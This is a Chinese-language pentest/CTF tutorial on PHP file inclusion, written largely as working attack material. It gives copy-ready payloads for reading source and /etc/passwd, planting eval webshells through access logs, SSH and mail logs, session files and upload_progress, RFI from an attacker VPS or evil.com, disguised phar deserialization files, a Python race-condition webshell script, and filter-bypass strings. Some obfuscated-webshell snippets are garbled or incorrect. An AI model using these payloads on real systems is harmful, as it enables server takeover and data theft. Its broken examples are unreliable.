##  文件包含本质与原理

### 定义

**文件包含（File Inclusion）**：程序通过动态包含文件的方式加载代码或模板，当被包含的文件路径**完全由用户控制**且未做严格校验时，攻击者可以让程序包含任意文件——本地敏感文件（LFI）、远程恶意 PHP 脚本（RFI）、或通过伪协议执行代码。本质是**把"加载哪个文件"的决定权交还给了攻击者**。

```
攻击者  ──控制包含路径──▶  include($_GET['file']);
                              │
              ┌───────────────┼───────────────┐
              ▼               ▼               ▼
        本地敏感文件      远程恶意脚本      PHP 伪协议
        /etc/passwd      http://x/s.txt    php://input 执行代码
        数据库配置        RCE 直接 getshell   phar:// 反序列化
```



### PHP 四个包含函数的区别

| 函数             | 文件不存在时           | 重复包含   | 典型场景                     |
| :--------------- | :--------------------- | :--------- | :--------------------------- |
| `include()`      | 产生 Warning，继续执行 | 每次都包含 | 模板加载、页面路由（最常见） |
| `require()`      | 产生 Fatal Error，停止 | 每次都包含 | 加载核心库文件               |
| `include_once()` | Warning                | 只包含一次 | 加载类定义、配置             |
| `require_once()` | Fatal                  | 只包含一次 | 框架引导文件                 |

四个函数在**文件包含漏洞**上行为一致——只要路径可控，区别只在报错级别，不影响利用。



### 形成的两个充要条件

| 条件               | 说明                                               | 典型代码                           |
| :----------------- | :------------------------------------------------- | :--------------------------------- |
| ① 程序使用动态包含 | include/require 的参数来自外部输入                 | `include($_GET['page'] . '.php');` |
| ② 路径校验不足     | 未白名单、可目录穿越、可指定绝对路径、可使用伪协议 | 直接拼接收参，无过滤               |



注意:

被 include 的文件中，**所有 <?php ?> 标签内的代码都会被执行**。这就是为什么日志里 UA 写一句 `<?php phpinfo();?>`，再包含日志文件就能 getshell——日志本身是文本，但只要里面有 PHP 代码标签，include 就会执行它。



### 常见漏洞场景

| 场景                   | 功能描述                               | 风险点                        |
| :--------------------- | :------------------------------------- | :---------------------------- |
| **高频** 模板/主题切换 | 用户切换站点皮肤、邮件模板             | 参数直接拼 include 路径       |
| **高频 **多语言切换    | ?lang=zh-cn → include 'lang/zh-cn.php' | 经典中的经典，CTF 必考        |
| **高频** 页面路由      | ?page=home / ?mod=user / ?action=login | MVC 早期实现方式，遍布老站    |
| **高频 **插件加载      | 后台启用插件 ?plugin=pay/alipay        | 管理员功能但常未鉴权          |
| **中频 **错误页/帮助页 | ?view=404 / ?help=install              | 开发者常忽略对这些路径过滤    |
| **中频 **缓存/日志查看 | 查看模板编译缓存、错误日志             | 能控制缓存内容时直接 getshell |
| **中频 **文件管理器    | 在线编辑器、文件预览                   | 天然包含文件，常配合上传      |
| **中频 **SDK/接口加载  | 支付/短信 SDK 按参数加载               | 老电商站常见                  |
| **低频 **CLI 脚本      | 定时任务按参数加载模块                 | 通过 SSRF/命令注入触达        |
| **低频 **CMS 标签      | 模板引擎里 {include:file=xxx}          | Smarty/Twig/ThinkPHP 历史 CVE |





## 文件包含分类

### 按被包含文件来源分类

| 类型           | 全称                               | 原理                                       | 危害上限                              |
| :------------- | :--------------------------------- | :----------------------------------------- | :------------------------------------ |
| **LFI**        | Local File Inclusion 本地文件包含  | 包含服务器本地文件（passwd、日志、配置）   | 读敏感文件 + 配合日志/Session RCE     |
| **RFI**        | Remote File Inclusion 远程文件包含 | 通过 http:// 包含远程服务器上的 PHP 脚本   | 直接 RCE（需要 allow_url_include=On） |
| **伪协议包含** | PHP Stream Wrapper                 | 用 php://、data://、phar:// 等包装器做包含 | 无需本地文件即可 RCE / 反序列化       |



### 按利用阶段分类

- **信息泄露阶段**：读 /etc/passwd 证明漏洞；读配置文件拿数据库账号密码。
- **代码执行阶段**：通过日志/Session/伪协议让服务器执行任意 PHP。
- **持久化阶段**：写 WebShell、读 SSH Key、读应用源码做二次审计。



### 与 PHP 配置项的对应关系

| 配置项              | 默认值（PHP<5.3） | 默认值（PHP≥5.4） | 影响                                                         |
| :------------------ | :---------------- | :---------------- | :----------------------------------------------------------- |
| `allow_url_fopen`   | On                | On                | 是否允许用 http:// ftp:// 打开远程文件（影响 file_get_contents） |
| `allow_url_include` | On                | **Off**           | 是否允许 include/require 远程文件 + php://input + data://    |

关键记忆点

现代 PHP（5.4+）`allow_url_include=Off` 是默认，意味着 **RFI、php://input、data:// 这三个直接 RCE 的路子默认全断**。但 `php://filter`、`phar://`、`zip://`、日志包含、Session 包含**不受这两个开关影响**——这就是现代 PHP 下 LFI 仍能 RCE 的全部原因。



## PHP 伪协议大全

PHP 允许在 include 路径处使用 `协议://` 形式的流包装器。下面这张表是文件包含漏洞**最核心的武器库**

| 伪协议              | allow_url_fopen | allow_url_include       | 能否 include | 用途                           |
| :------------------ | :-------------- | :---------------------- | :----------- | :----------------------------- |
| `php://filter`      | 不需要          | 不需要                  | **能**       | 读源码（base64 编码）          |
| `php://input`       | 需要 On         | **需要 On**             | 能（RCE）    | POST 原始数据当 PHP 执行       |
| `data://`           | 需要 On         | **需要 On**             | 能（RCE）    | 内联数据执行 PHP               |
| `http://`           | 需要 On         | **需要 On**             | 能（RFI）    | 远程包含恶意 PHP               |
| `ftp://`            | 需要 On         | 不支持 include          | 否           | 读文件（被动模式可打内网）     |
| `phar://`           | 不需要          | 不需要                  | **能**       | 解包 phar 文件 + 触发反序列化  |
| `zip://`            | 不需要          | 不需要                  | **能**       | 解压 zip 内文件并包含          |
| `compress.bzip2://` | 不需要          | 不需要                  | 能           | 同 zip，bzip2 格式             |
| `compress.zlib://`  | 不需要          | 不需要                  | 能           | 同 zip，gzip 格式              |
| `expect://`         | 需要            | 需要（编译时装 expect） | 能（RCE）    | 执行系统命令（极少默认开启）   |
| `file://`           | 不需要          | 不需要                  | 能           | 读本地文件（绝对路径）         |
| `glob://`           | -               | -                       | 不能 include | 列目录（file_get_contents 用） |

###  php://filter —— 读源码之王

`php://filter` 是现代 PHP 下**最常用、最不受开关限制**的读源码手段。它的作用是在数据流入 include 之前，用一系列"过滤器"处理数据。



最基础写法（base64 编码输出源码）:

```
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://filter/convert.base64-encode/resource=index.php
# 等价写法，区别只是省略 read=
```

返回的是 index.php 的 base64 编码字符串，本地解码后即可看到完整源码



其他过滤器（五花八门）

```
# 1. string.rot13 —— 对源码做 rot13 编码输出
?file=php://filter/read=string.rot13/resource=index.php

# 2. convert.iconv —— 字符编码转换（Bypass 常用）
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# 3. 多过滤器链式调用（Bypass 黑名单）
?file=php://filter/convert.base64-decode|convert.base64-encode|convert.base64-decode/resource=index.php

# 4. 读取环境变量（配合 LD_PRELOAD 等绕过姿势）
?file=php://filter/resource=/etc/passwd
```



当 WAF 或程序过滤了 `base64` 字符串本身时，可以用多种过滤器组合绕过：

| 过滤场景                      | Bypass Payload                                               |
| :---------------------------- | :----------------------------------------------------------- |
| 过滤了 `base64` 关键字        | `php://filter/read=string.rot13/resource=index.php`          |
| 过滤了 `filter`               | 大小写：`PHP://Filter/...`（Linux 下 PHP 协议名不区分大小写） |
| 过滤了 `read=`                | 省略：`php://filter/convert.base64-encode/resource=...`      |
| 正则拦截 base64-encode 字符串 | 多段 filter 链式调用：`php://filter/convert.iconv.UTF-8.UCS-2LE|convert.base64-encode/resource=index.php` |



高阶 Bypass:

利用 iconv 的字符集转换错误来"生成"特定字符

```
# 常见可用的 iconv 链（把一种编码转成另一种，中间产生垃圾字节）
格式：convert.iconv.源编码.目标编码
convert.iconv.UTF-8.UTF-16BE
convert.iconv.UTF-8.CP1047
convert.iconv.UTF-8.UTF-7
convert.iconv.UCS-2LE.UCS-2BE/resource=index.php
convert.iconv.8859_1.UTF-16/resource=index.php
```



### php://input —— POST 数据直接 RCE

把 POST 请求体的**原始数据**作为文件内容包含进来。需要 `allow_url_include=On`。

```
POST /vuln.php?file=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

PHP 会把 `<?php system('id');?>` 当成被包含文件的内容直接执行。

两个坑

- Content-Type 必须是 `application/x-www-form-urlencoded` 或空，**不能是 multipart/form-data**——否则 php://input 读不到数据。
- php://input 不能被二次读取（现代 PHP 已修复），但在旧版本里 POST 数据同时会被 file_get_contents('php://input') 读走。



### data:// —— 内联数据 RCE

直接在 URL 里塞 PHP 代码，无需任何外部文件。需要 `allow_url_include=On`。

```
# 经典写法
?file=data://text/plain,<?php phpinfo();?>

# base64 编码版本（避免特殊字符被过滤）
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+

# 带后缀限制时（程序自动补 .php）
?page=data://text/plain,<?php system('cat /flag');?>
# 最终: data://...<?php...?>.php —— .php 后缀被忽略，data 协议已结束
```



### phar:// —— 反序列化入口

`phar://包文件/包内文件` 是 **phar 伪协议的 URI 格式**

```
?file=phar://./uploads/shell.jpg/test.txt
# 原理: shell.jpg 实际是伪装成图片的 phar 文件
#       包含时 PHP 会反序列化 phar 文件头中存储的 metadata
#       触发 __destruct / __wakeup 里的 gadget chain
```

`test.txt` 是**写在这个 phar 归档里面的一个内部文件名字**，它**本身内容不重要，只是语法上必须指定包里的一个成员**。



### zip:// / bzip2:// / zlib:// —— 压缩包内文件包含

```
# zip:// 格式: zip://压缩包绝对路径#包内文件名
?file=zip://./uploads/shell.zip%23shell.php
# # 必须 URL 编码成 %23，否则会被当锚点截断

# bzip2 / zlib 类似，没有 # 而是直接拼接
?file=compress.bzip2://./uploads/shell.bz2
?file=compress.zlib://./uploads/shell.gz
```

**利用要点**：先上传一个压缩包（如 zip），里面放一个 PHP webshell，然后用 zip:// 包含它。这是**绕过"上传 .php 直接被拦"的经典姿势**——上传 .zip 通常白名单允许，包含时自动解压。



### expect:// —— 直接命令执行

```
?file=expect://id
?file=expect://whoami
# 需要 PHP 编译时加载 expect 扩展，极少见
# 一般出现在某些 CTF 题目或特殊定制环境
```



## 日志文件包含 RCE

是现代 PHP（allow_url_include=Off）下 **LFI getshell 的第一大路**。

原理：让 PHP 代码出现在某个日志文件里，然后用 include 包含这个日志文件。



### 可用的日志/记录文件一览

| 日志文件           | 默认路径（Linux）                                       | 谁会往里写 PHP                         |
| :----------------- | :------------------------------------------------------ | :------------------------------------- |
| Apache access.log  | /var/log/apache2/access.log · /var/log/httpd/access_log | UA 头、请求路径                        |
| Apache error.log   | /var/log/apache2/error.log                              | 错误信息里的请求内容                   |
| Nginx access.log   | /var/log/nginx/access.log                               | UA 头、请求路径                        |
| Nginx error.log    | /var/log/nginx/error.log                                | 错误信息                               |
| SSH auth.log       | /var/log/auth.log · /var/log/secure                     | SSH 登录用户名                         |
| maillog            | /var/log/maillog · /var/log/mail.log                    | 邮件内容（发邮件可注入）               |
| /proc/self/environ | /proc/self/environ                                      | 环境变量（UA 头也在里面）              |
| /proc/self/fd/N    | /proc/self/fd/0~N                                       | 进程打开的文件描述符（含临时上传文件） |
| CMS 自己的日志     | ./runtime/log/ · ./data/log/                            | 后台操作记录                           |



### Apache/Nginx access.log 包含完整流程

Step 1：确认日志路径可读

```
?file=/var/log/apache2/access.log
# 如果回显日志内容（一堆 IP 和请求记录），说明可读
# 如果 404/空白，试其他常见路径：
?file=/var/log/httpd/access_log
?file=/var/log/nginx/access.log
?file=../../../var/log/apache2/access.log
```

Step 2：往 UA 头里写 PHP 代码

用 Burp 或 curl 发一个请求，把 User-Agent 改成 PHP 一句话：

```
GET / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 <?php @eval($_POST['cmd']);?>

# access.log 里就会多一行:
# 1.2.3.4 - - [10/Nov/2026:12:00:00] "GET / HTTP/1.1" 200 123 "-" "Mozilla/5.0 <?php @eval..."
```

Step 3：包含 access.log

```
?file=/var/log/apache2/access.log
# 此时 PHP 解析日志里的 <?php ?> 标签
# 一句话木马生效，用菜刀/蚁剑连接
```

蚁剑连接配置

```
URL:    http://target.com/vuln.php?file=/var/log/apache2/access.log
密码:   cmd
连接类型: PHP
# 注意 URL 里 ?file=... 本身是 GET 参数
# 蚁剑发的 POST 数据会被 eval($_POST['cmd']) 执行
```



### 为什么用 error.log 而不是 access.log

某些服务器配置了 access.log 不记录 UA，或者 access.log 太大被截断。这时试 error.log——任何请求错误都会把请求行写进 error.log，包括 UA。

```
# 故意访问一个不存在的路径，让 error.log 记录
GET /<?php phpinfo();?> HTTP/1.1
User-Agent: Mozilla/5.0

# 然后包含 error.log
?file=/var/log/apache2/error.log
```



###  /proc/self/environ 包含（老版本 Linux）

`/proc/self/environ` 保存了当前进程的环境变量，其中 `HTTP_USER_AGENT` 就是 UA 头。原理同 access.log，但无需猜日志路径。

```
# 1. UA 写 PHP
User-Agent: <?php system('id');?>

# 2. 包含 environ
?file=/proc/self/environ

# 注意: 现代 Linux 出于安全考虑，
# Web 进程对 /proc/self/environ 是不可读的（hidepid）
# 老系统/CTF 环境才有效
```



### SSH 日志包含

当目标没有 Web 日志可读，或者日志路径不知道时，可以 SSH 登录目标，把用户名写成 PHP 代码：

```
# 攻击机执行（用 SSH 登录，用户名是 PHP 代码）
ssh '<?php system($_GET[cmd]);?>'@target.com

# SSH 会把这次失败登录记录到 /var/log/auth.log:
# Nov 10 12:00:00 sshd[1234]: Failed password for <?php system...?> from x.x.x.x

# 然后包含 auth.log
?file=/var/log/auth.log&cmd=id
```



### mail.log 包含

如果目标开了本地 sendmail/postfix，可以用 SMTP 发邮件，邮件正文写 PHP，然后包含 /var/log/maillog。

```
nc target.com 25
EHLO x
MAIL FROM:<a@a.com>
RCPT TO:<root@localhost>
DATA
Subject: test
<?php system('id');?>
.
QUIT

# 然后:
?file=/var/log/maillog
```

日志包含的常见坑

- **路径权限**：日志文件通常 640，Web 用户（www-data）不一定有读权限——读不到就换其他日志。
- **日志轮转**：logrotate 会把日志切割成 access.log.1、access.log.2.gz，刚写入的 PHP 可能被轮转走。
- **UA 被过滤**：WAF 会拦截 UA 里的 `<?php`，可以用 `<?=`id`;?>` 短标签，或者把 PHP 写在 URL 路径里而不是 UA。
- **日志太大**：access.log 几百 M 时，include 会很慢或超时——尽量写在最近几行。



## Session 文件包含 RCE

当日志路径猜不到、日志不可读时，**Session 文件包含**是第二大路。

原理：PHP Session 会以文件形式存在服务器上，如果你能控制 Session 文件内容，再包含它就能 RCE。



###  PHP Session 文件位置

| 配置              | 默认值                                              | 说明                 |
| :---------------- | :-------------------------------------------------- | :------------------- |
| session.save_path | /tmp · /var/lib/php/sessions · /var/lib/php/session | Session 文件存放目录 |
| session.name      | PHPSESSID                                           | Cookie 名            |
| 文件名格式        | sess_<PHPSESSID值>                                  | 例如 sess_a1b2c3d4e5 |



###  Session 文件里能写什么

PHP Session 文件内容是序列化后的键值对。常见可控点：

- **PHPSESSID 本身**：某些程序会把用户 ID / 用户名存进 session。
- **用户名/昵称**：注册时填的用户名会被写进 session。
- **session.upload_progress**：上传文件时 PHP 自动写的进度信息（重点）。
- **后台操作日志**：登录日志、最后访问 URL。



### 经典利用流程

```
# 1. 注册一个用户名，填 PHP 代码
用户名: <?php @eval($_POST['cmd']);?>

# 2. 登录，让程序把用户名写进 session
#    此时 /tmp/sess_xxxxx 文件内容类似:
# username|s:28:"<?php @eval($_POST['cmd']);?>";

# 3. 拿到自己的 PHPSESSID（Cookie 里看）
Cookie: PHPSESSID=abc123

# 4. 包含 session 文件
?file=/tmp/sess_abc123

# 一句话木马生效，蚁剑连接
```





### session.upload_progress 包含（无需注册）

这是**无需任何业务功能**就能控制 Session 内容的纯 PHP 特性，CTF 高阶考点。

原理:当 `session.upload_progress.enabled=On`（默认开）时，只要你带着 PHPSESSID Cookie 上传一个文件，PHP 会自动把上传信息写入该 session 文件，其中 `upload_progress_<key>` 的值就是你 POST 的字段名——**字段名你随便写**。

利用步骤:

```
# 1. 浏览器/脚本发一个上传请求，Cookie 带 PHPSESSID=evil
#    POST 一个文件，同时表单里加一个字段:
#    PHP_SESSION_UPLOAD_PROGRESS = <?php @eval($_POST['cmd']);?>

POST /upload HTTP/1.1
Cookie: PHPSESSID=evil
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php @eval($_POST['cmd']);?>
------x
Content-Disposition: form-data; name="file"; filename="a.jpg"

[文件内容]
------x--

# 2. PHP 自动写入 /tmp/sess_evil:
#    upload_progress_<?php...?>|a:5:{...}

# 3. 包含 session 文件
?file=/tmp/sess_evil

# 注意: 上传完成后 progress 信息会被清掉
#       所以要一边高速上传（竞争）一边包含
```

为什么要"竞争"？

session.upload_progress 写入的信息在**上传完成后会立刻被删除**。所以你需要：一个线程不停发上传请求（保持 session 文件里有 PHP 代码），另一个线程不停请求包含 `/tmp/sess_evil`，在"写进去了"和"还没被清掉"的时间窗口里撞上——这就是条件竞争。

#    看 session.save_path

# 2. 扫常见路径
?file=/tmp/sess_abc123
?file=/var/lib/php/sessions/sess_abc123
?file=/var/lib/php/session/sess_abc123
?file=/var/lib/php5/sessions/sess_abc123

## 路径截断与后缀绕过

当程序写的是 `include($page . '.php')`，我们传的路径后面会被自动拼一个 `.php`。怎么让这个 .php 失效？这就是本章要解决的问题。



### %00 空字节截断（经典老姿势）

PHP 在处理 C 语言字符串时，遇到 `\x00` 会认为字符串结束。URL 编码成 `%00`。

```
# 程序: include($page . '.php')
?page=/etc/passwd%00

# PHP 实际拼接: /etc/passwd\0.php
# 由于 \0 是字符串结束符，实际只包含 /etc/passwd
```

| 条件                  | 说明                           |
| :-------------------- | :----------------------------- |
| PHP < 5.3.4           | %00 截断直接有效               |
| magic_quotes_gpc = On | %00 会被转义成 \0 字符串，失效 |
| PHP ≥ 5.3.4           | 官方修复，%00 截断失效         |

现代环境

2026 年了，%00 截断基本只在 CTF 老题和极度老旧的生产环境里有效。但**理解原理很重要**——很多绕过思路都是从"如何让 .php 后缀失效"这个问题衍生的。



### 路径长度截断（. / ）

Linux 下文件名长度有上限（PATH_MAX = 4096），当路径过长时，后面的 `.php` 会被"挤掉"。

```
# 原理: 构造一个超长路径，让 .php 落在 4096 字节之外被丢弃
?page=/etc/passwd/././././././././././././././...（重复几百个 ./）...

# 或者用 / 截断
?page=/etc/passwd/../../../../../../../../../../...（重复几百个 ../）...

# Windows 下用点截断: 路径长度超过 256 时，尾部的 .php 会被丢
?page=C:\Windows\win.ini\...................（几百个点）...................
```

**条件**：PHP < 5.3.4，且 `magic_quotes_gpc=Off`。现代 PHP 同样基本失效，但 CTF 偶有出现。



### 利用伪协议不受后缀影响

这是**现代环境最实用**的绕过方式——根本不需要截断！因为伪协议在 `.php` 拼上来之前就已经"结束"了。

| Payload                           | 拼接后                                | 实际效果                                       |
| :-------------------------------- | :------------------------------------ | :--------------------------------------------- |
| `php://filter/.../resource=index` | `php://filter/.../resource=index.php` | resource 自动定位 index.php，.php 被自然吃掉   |
| `php://input`                     | `php://input.php`                     | php://input 不关心后面的后缀，照样读 POST 数据 |
| `data://text/plain,<?php...?>`    | `data://...<?php...?>.php`            | data 协议数据已结束，.php 被忽略               |
| `phar://uploads/x.jpg/a`          | `ph://uploads/x.jpg/a.php`            | phar:// 解析时找的是包内 a.php，自动适配       |
| `zip://uploads/x.zip%23a`         | `zip://uploads/x.zip%23a.php`         | # 后面的 a.php 是包内文件名，正确              |



### 常见字符串绕过姿势

| 过滤规则       | 绕过方法         | 示例                                              |
| :------------- | :--------------- | :------------------------------------------------ |
| 过滤 `../`     | 嵌套 str_replace | `....//` → 替换后变成 `../`                       |
| 过滤 `../`     | 编码绕过         | `..%2f` · `..%5c` · `..%252f`（二次编码）         |
| 过滤 `php://`  | 大小写           | `PHP://filter` · `PhP://filter`                   |
| 过滤 `http://` | 大小写/短协议    | `HTTP://` · `//evil.com/shell.txt`                |
| 过滤 `http`    | 换行/Tab 分隔    | `http:/\evil.com` · `http://evil.com:80\@target/` |
| 过滤空格       | URL 编码         | `%20` · `%09`（Tab）· `%0a`（换行）               |
| 过滤 `/`       | 绝对路径不写前缀 | 直接写 `etc/passwd`（相对当前目录）               |
| 过滤 `/etc/`   | 软链接/相对路径  | `../../../etc/passwd` 配合目录穿越                |



### 目录穿越深度计算

程序写的是 `include('./pages/' . $page . '.php')`，我们要读 /etc/passwd，需要穿越多少层？

```
# 当前工作目录一般是网站根目录，如 /var/www/html/
# include 的完整路径是: /var/www/html/pages/$page.php
# 要到 /etc/passwd，需要从 pages/ 往上走 3 层到 /var/www/html/
# 再往上 2 层到 /var/，再往上 1 层到 /，然后进 etc/
# 总共 ../../../.. 足够（多写几层无害，../ 到根就停了）

?page=../../../../../../etc/passwd%00

# 经验: 直接写 10 个 ../ 起步，不够再加
# 因为 Linux 根目录下再 ../ 也不会报错，只是停在 /
```



## 远程包含 RFI

当 `allow_url_include=On` 时，include 函数可以直接加载远程 URL 指向的 PHP 文件。攻击者在自己 VPS 上放一句话木马，让目标服务器来包含它。



### 完整利用流程

```
# 1. 攻击机 VPS 上准备 shell.txt（注意扩展名不能是 php，
#    否则 Apache 会执行它而不是返回源码）
echo '<?php @eval($_POST["cmd"]);?>' > /var/www/html/shell.txt

# 2. 目标站包含远程文件
?file=http://你的VPS_IP/shell.txt

# 3. 蚁剑连接
URL: http://target.com/vuln.php?file=http://VPS/shell.txt
密码: cmd
```

注意:

为什么远程文件要 .txt 而不是 .php?

如果你在 VPS 上放 `shell.php`，目标服务器请求它时，VPS 上的 Apache 会**先执行这个 PHP**，返回执行结果（空白），而不是 PHP 源码。include 拿到的是空白，自然不会执行任何代码。

放成 `.txt`，Apache 把它当纯文本返回，目标服务器 include 拿到 `<?php ...?>` 源码，再在**目标服务器本地**执行——这才是正确流程。



## phar 反序列化利用

phar（PHP Archive）是把多个 PHP 文件打包成一个文件的格式，类似 jar。它有一个关键特性：**文件头的 metadata 字段是序列化存储的 PHP 对象**。当 PHP 用 `phar://` 协议访问这个文件时，会自动反序列化 metadata——哪怕代码里没有显式调用 unserialize()。

###  触发链

```
include('phar://uploads/shell.jpg/test.txt')
        │
        ▼
PHP 读取 shell.jpg，发现是 phar 格式
        │
        ▼
自动反序列化文件头中的 metadata（一个恶意构造的对象）
        │
        ▼
触发该类的 __destruct() 或 __wakeup()
        │
        ▼
如果项目里存在 gadget chain（如文件删除、文件写入、RCE）
        │
        ▼
RCE
```

 为什么是"文件包含"而不是"文件上传"漏洞:

phar 反序列化的触发点**不止 include**。任何调用了文件系统函数的地方都会触发：

- `include()` / `require()` —— 本章主角
- `file_exists()` / `is_dir()` / `is_file()`
- `filesize()` / `file_get_contents()`
- `fopen()` / `opendir()`
- `getimagesize()` / `filemtime()`

只要参数是 `phar://xxx`，这些函数都会触发反序列化。所以它既是 LFI 的延伸，也是文件上传 + 反序列化的组合拳。

### 制作恶意 phar 文件

```
# 1. 写一个生成脚本 gen.php
<?php
class Test {
    public $poc;
    function __destruct() {
        system($this->poc);  // 这里换成目标项目里真实的 gadget
    }
}
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Test();
$o->poc = 'id';
$phar->setMetadata($o);  // 恶意对象塞进 metadata
$phar->addFromString('test.txt', 'anything');
$phar->stopBuffering();
?>

# 2. 本地执行生成 shell.phar
php gen.php

# 3. 伪装成图片（改后缀 + 加 GIF 头）
mv shell.phar shell.jpg
echo "GIF89a" | cat - shell.jpg > shell_fake.jpg

# 4. 上传 shell_fake.jpg 到目标站（绕过图片检测）

# 5. 文件包含触发
?file=phar://./uploads/shell_fake.jpg/test.txt
```

### 绕过 phar:// 限制的技巧

| 限制                     | 绕过姿势                                                     |
| :----------------------- | :----------------------------------------------------------- |
| 过滤了 `phar://` 字符串  | 空路径绕过：`phar://./uploads/shell.jpg` · `phar:uploads/shell.jpg` |
| open_basedir 限制        | phar 文件在 basedir 内即可触发，不受反序列化后操作路径限制   |
| 过滤了 `://`             | 用 `phar://` 换成 `PHAR://`（大小写）                        |
| 文件上传检测 phar 魔术字 | 在 stub 前面加 GIF89a，PHP 仍能识别（__HALT_COMPILER 才是标志） |

PHP 版本演进

PHP 8.0 后，phar 反序列化默认仍可用，但很多框架开始在文件函数里禁用 phar:// 协议（如 Symfony 的 Filesystem）。真实项目中遇到 phar 反序列化，重点是**先审计项目里有没有可用的 gadget chain**——没有 gadget，光触发反序列化什么也干不了。



## 条件竞争临时文件包含

PHP 上传临时文件机制:

PHP 处理 multipart/form-data 上传时，会先把文件写到临时目录（通常 `/tmp/phpXXXXXX`），等脚本执行完再删除。这个"写入 → 删除"之间的时间窗口，就是条件竞争的攻击面。



### 攻击原理

- 上传一个 PHP 文件（内容是 webshell），PHP 会把它存到 /tmp/phpABCDEF。
- 脚本结束后立刻删除这个临时文件。
- 但在删除之前，如果你能**飞快地包含 /tmp/phpABCDEF**，就能执行其中的 PHP 代码。
- 问题是你不知道临时文件名（phpXXXXXX 是随机的 6 个字符）。



### /proc/self/fd 猜文件名

`/proc/self/fd/` 目录下有当前进程打开的所有文件描述符，其中 fd/0 到 fd/N 对应打开的文件。刚上传时，临时文件还没被删，可以通过遍历 fd 找到它。

```
# 1. 一个线程不停上传 PHP 文件
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=x

--x
Content-Disposition: form-data; name="file"; filename="a.php"
Content-Type: application/octet-stream

<?php system($_GET['c']);?>
--x--

# 2. 另一个线程疯狂包含 /proc/self/fd/N，N 从 0 到 100
?file=/proc/self/fd/3&c=id
?file=/proc/self/fd/4&c=id
?file=/proc/self/fd/5&c=id
...

# 3. 某一次撞上，就执行成功
```



### Python 竞争脚本模板

```
import requests, threading

URL = "http://target.com/vuln.php"
UPLOAD_URL = "http://target.com/upload.php"

def upload():
    while True:
        files = {'file': ('a.php', b'<?php system($_GET["c"]);?>')}
        try:
            requests.post(UPLOAD_URL, files=files, timeout=2)
        except: pass

def include():
    while True:
        for i in range(0, 50):
            try:
                r = requests.get(f"{URL}?file=/proc/self/fd/{i}&c=id", timeout=2)
                if "uid=" in r.text:
                    print("[+] HIT:", r.text)
                    exit()
            except: pass

threading.Thread(target=upload, daemon=True).start()
include()
```



### session.upload_progress 竞争

session.upload_progress 写入的 PHP 代码在上传完成后会被清除。经典竞争：

- 线程 A：不停上传（带 PHPSESSID=evil，PHP_SESSION_UPLOAD_PROGRESS 写 PHP 代码）。
- 线程 B：不停请求 `?file=/tmp/sess_evil`。
- 在"session 文件刚写入但还没被清"的窗口期命中，RCE。

这是 CTF 里 session.upload_progress 题目的标准解法。



## 无字母数字 Webshell

当 WAF 或程序过滤了字母、数字、常见关键词（如 `php`、`eval`、`system`）时，怎么构造 webshell？这是文件包含 + WAF 绕过的终极考点。

### 异或构造（最经典）

PHP 中两个字符串异或，可以得到一个新字符。如果黑名单只过滤了小写字母和数字，我们用可见符号（如 `!@#$`）异或出任意字母。

```
# 原理: 在 PHP 里，两个字符按位异或
# '!' 是 0x21，'@' 是 0x40，异或得 0x61 = 'a'
# 我们可以拼出: $_=!@#$%^...; $_() 就是执行函数

# 经典一句话（无字母数字）
?file=php://input
<?php
$_=('!'/'*').'/'/'(';   # 构造出 "_GET" 或 "_POST"
$$_();                  # 可变函数调用
?>

# 更直接的异或版:
<?php
$_=("%01%02%03"^"%04%05%06");   # 异或出 GET
$__="_".$_;
$$__();
?>
```

### 取反构造

PHP 7+ 支持对字符串取反，把不可见字符变成字母。

```
<?php
$_=~"\x8f\x97\x9a\x93";   # 取反得到 "_GET"
$__="_".$_;
$$__[1]($$__[2]);          #  $_GET[1]($_GET[2])
?>

# 传参:
?file=php://input
POST 数据里: 1=system&2=id
```



### 自创建 webshell

当连 `php://input`、`eval` 都被过滤时，可以用文件包含 + filter 链**动态生成**一个 webshell 文件。

```
# 思路: 用 php://filter 把一段 base64 解码后写入日志/临时文件
#       再包含那个文件——全程不需要在 URL 里出现 eval/system 等关键字

# 1. 先把一句话木马的 base64 算好
echo -n '<?php @eval($_POST[cmd]);?>' | base64
# 输出: PD9waHAgQGV2YWwoJF9QT1NUW2NdKTs/Pg==

# 2. 用 filter 链分多次解码，拼出这个字符串
#    （具体链因过滤规则而异，原理是 base64-decode 多次）
```
